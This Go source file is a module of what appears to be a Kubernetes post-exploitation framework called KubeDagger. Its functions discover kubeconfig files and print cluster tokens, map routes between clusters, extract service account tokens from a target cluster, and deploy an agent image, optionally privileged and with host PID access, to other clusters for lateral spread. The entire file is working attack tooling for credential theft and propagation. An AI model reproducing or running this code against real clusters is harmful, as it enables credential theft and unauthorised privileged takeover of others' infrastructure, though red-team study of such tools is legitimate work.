package modules

import (
	"context"
	"fmt"
	"strings"

	"github.com/yasindce1998/KubeDagger/pkg/multicluster"
)

type MultiCluster struct{}

func (m *MultiCluster) Name() string      { return "multicluster" }
func (m *MultiCluster) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *MultiCluster) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "discover"
	}

	switch action {
	case "discover":
		return m.discover(ctx, args)
	case "propagate":
		return m.propagate(ctx, args)
	case "routes":
		return m.routes(ctx, args)
	case "tokens":
		return m.tokens(ctx, args)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *MultiCluster) discover(ctx context.Context, args map[string]string) (*Result, error) {
	sources, err := multicluster.DiscoverKubeconfigs(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	var output []string
	for _, src := range sources {
		output = append(output, fmt.Sprintf("[%s] %s (%d clusters)", src.Type, src.Path, len(src.Clusters)))
		for _, cluster := range src.Clusters {
			tokenPreview := "none"
			if cluster.Token != "" {
				tokenPreview = cluster.Token[:min(20, len(cluster.Token))] + "..."
			}
			output = append(output, fmt.Sprintf("  - %s: %s (token=%s)", cluster.Name, cluster.Server, tokenPreview))
		}
	}

	if len(output) == 0 {
		return &Result{Success: true, Output: "no kubeconfigs discovered"}, nil
	}

	return &Result{
		Success: true,
		Output:  strings.Join(output, "\n"),
	}, nil
}

func (m *MultiCluster) propagate(ctx context.Context, args map[string]string) (*Result, error) {
	target := args["target"]
	image := args["image"]
	namespace := args["namespace"]

	if target == "" {
		return &Result{Success: false, Error: "target cluster server required"}, nil
	}
	if image == "" {
		return &Result{Success: false, Error: "agent image required"}, nil
	}

	cluster := multicluster.ClusterInfo{
		Name:   args["name"],
		Server: target,
		Token:  args["token"],
	}

	client, err := multicluster.BuildClientFromCluster(cluster)
	if err != nil {
		return &Result{Success: false, Error: fmt.Sprintf("connect to target: %s", err)}, nil
	}

	propagator := multicluster.NewPropagator(client, image)
	opts := multicluster.DeployOpts{
		Image:      image,
		Namespace:  namespace,
		Name:       args["deploy_name"],
		HostPID:    args["host_pid"] == "true",
		Privileged: args["privileged"] == "true",
	}

	if serverArgs := args["agent_args"]; serverArgs != "" {
		opts.Args = strings.Split(serverArgs, " ")
	}

	method := args["method"]
	if method == "pod" {
		err = propagator.DeployAsJob(ctx, cluster, opts)
	} else {
		err = propagator.DeployToCluster(ctx, cluster, opts)
	}

	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("deployed agent to cluster %s via %s", target, method),
	}, nil
}

func (m *MultiCluster) routes(ctx context.Context, _ map[string]string) (*Result, error) {
	sources, err := multicluster.DiscoverKubeconfigs(ctx)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	var allClusters []multicluster.ClusterInfo
	for _, src := range sources {
		allClusters = append(allClusters, src.Clusters...)
	}

	rt := multicluster.BuildRouteTable(allClusters)
	return &Result{
		Success: true,
		Output:  multicluster.FormatRouteTable(rt),
	}, nil
}

func (m *MultiCluster) tokens(ctx context.Context, args map[string]string) (*Result, error) {
	target := args["target"]
	if target == "" {
		return &Result{Success: false, Error: "target cluster server required"}, nil
	}

	cluster := multicluster.ClusterInfo{
		Name:   args["name"],
		Server: target,
		Token:  args["token"],
	}

	client, err := multicluster.BuildClientFromCluster(cluster)
	if err != nil {
		return &Result{Success: false, Error: fmt.Sprintf("connect: %s", err)}, nil
	}

	propagator := multicluster.NewPropagator(client, "")
	tokens, err := propagator.ExtractTokens(ctx, client)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	if len(tokens) == 0 {
		return &Result{Success: true, Output: "no service account tokens found"}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("found %d tokens:\n%s", len(tokens), strings.Join(tokens, "\n")),
	}, nil
}
